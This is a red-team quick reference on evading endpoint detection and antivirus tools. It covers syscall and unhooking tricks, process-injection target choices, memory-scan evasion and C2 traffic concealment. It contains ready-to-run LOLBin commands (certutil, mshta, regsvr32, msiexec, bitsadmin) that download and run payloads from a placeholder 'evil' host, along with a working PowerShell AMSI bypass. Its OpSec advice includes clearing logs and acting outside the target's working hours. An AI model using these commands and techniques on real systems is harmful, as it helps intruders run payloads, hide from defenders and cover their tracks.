# EDR/AV evasion and covert operations quick reference

> Source: summaries of multiple red-team engagements (2024-2026)
> Use this reference when you need to operate in an environment with EDR/AV protection.

---

## Detection layers and evasion methods

| Detection layer | What EDR does | Evasion method |
|-----------------|---------------|----------------|
| Static signatures | Matches known malicious file hashes/features | Custom compilation, encrypted payloads, modified features |
| User-mode Hook | Hooks ntdll.dll to monitor API calls | Direct system calls / Unhooking / own ntdll |
| Kernel callbacks | Registers process/thread/image-load callbacks | Remove callbacks (requires a driver) / inject into a legitimate process |
| ETW | Collects events through ETW | Patch EtwEventWrite / disable the provider |
| Behavior analysis | Analyzes call sequences and behavior patterns | Delayed execution / split operations / simulate normal behavior |
| Memory scanning | Scans process memory at intervals | Heap encryption / encrypt payload during Sleep / module stomping |
| Network detection | Analyzes outbound traffic patterns | Domain fronting / tunnel through legitimate services / encryption |

---

## Practical evasion techniques

### 1. Direct system calls (bypass user-mode Hook)

```
Principle: Call the kernel directly with the syscall instruction instead of using ntdll.dll.
Tools: SysWhispers3 / HellsGate / TartarusGate
Effect: Bypass all user-mode Hooks
```

### 2. Unhooking (restore the original ntdll)

```
Method A: Remap ntdll.dll from disk
Method B: Load a clean copy from the KnownDlls directory
Method C: Copy the .text section from a suspended process
Effect: Restore Hooked APIs to their original state
```

### 3. Process injection (choose a low-monitoring target)

```
Recommended injection targets (low monitoring):
- RuntimeBroker.exe
- sihost.exe
- taskhostw.exe
- explorer.exe (slightly higher risk)

Avoid injection into:
- lsass.exe (highly monitored)
- svchost.exe (a focus for some EDR products)
- powershell.exe / cmd.exe
```

### 4. Module stomping

```
Principle: Write the payload into the .text section of a loaded legitimate DLL.
Effect: Memory scans see a legitimate module instead of suspicious RWX memory.
```

### 5. Sleep encryption (Ekko/Zilean)

```
Principle: Encrypt the beacon's own memory during Sleep.
Effect: Memory scans cannot find payload features.
Implementation: Register a Timer callback, encrypt before Sleep, and decrypt after wake-up.
```

### 6. Call stack spoofing

```
Principle: Forge the call stack so API calls appear to come from legitimate code.
Effect: Bypass call-stack-based behavior detection.
```

---

## C2 traffic concealment

| Technique | Principle | Detection difficulty |
|-----------|-----------|----------------------|
| Domain fronting | The SNI and Host headers differ in an HTTPS request. | High |
| Cloudflare Workers | Relay through CF so the traffic appears to be normal HTTPS. | High |
| Legitimate Azure/AWS services | Use a cloud service API as a C2 channel. | Very high |
| DNS over HTTPS | Encode C2 data in DNS queries. | Medium |
| WebSocket | Use a long-lived connection mixed with normal Web traffic. | Medium |
| ICMP tunnel | Hide data in ICMP packets. | Low (easy to detect) |

---

## LOLBins (Living Off the Land)

Use legitimate programs included with the system to perform malicious actions:

| Program | Purpose | Command example |
|---------|---------|-----------------|
| certutil | Download a file | `certutil -urlcache -split -f http://evil/payload.exe` |
| mshta | Execute HTA | `mshta http://evil/payload.hta` |
| rundll32 | Load a DLL | `rundll32 evil.dll,EntryPoint` |
| regsvr32 | Load SCT | `regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll` |
| wmic | Execute remotely | `wmic /node:target process call create "cmd"` |
| msiexec | Install MSI | `msiexec /q /i http://evil/payload.msi` |
| bitsadmin | Download a file | `bitsadmin /transfer job http://evil/payload.exe C:\payload.exe` |
| forfiles | Execute a command | `forfiles /p c:\windows /m notepad.exe /c "cmd /c calc.exe"` |

---

## AMSI evasion (PowerShell)

```powershell
# Classic patch (may trigger signature detection)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Stealthier method: modify AmsiScanBuffer through reflection
# Or downgrade PowerShell to v2 (no AMSI)
powershell -version 2
```

---

## Operational security (OpSec) principles

1. **Minimum-action principle** — Avoid actions you do not need. Use existing credentials instead of creating new ones.
2. **Time window** — Operate outside the target's working hours to reduce manual review.
3. **Traffic blending** — Make C2 communication frequency and size resemble normal business traffic.
4. **Do not write tools to disk** — Execute in memory and clear the tools after use.
5. **Log awareness** — Know which logs each action creates. Avoid or clear those logs as permitted.
6. **Honeypot identification** — Identify honeypots before acting, such as unusually open services or overly attractive credentials.
7. **Split operations** — Do not complete all steps at once. Spread them across multiple time windows.
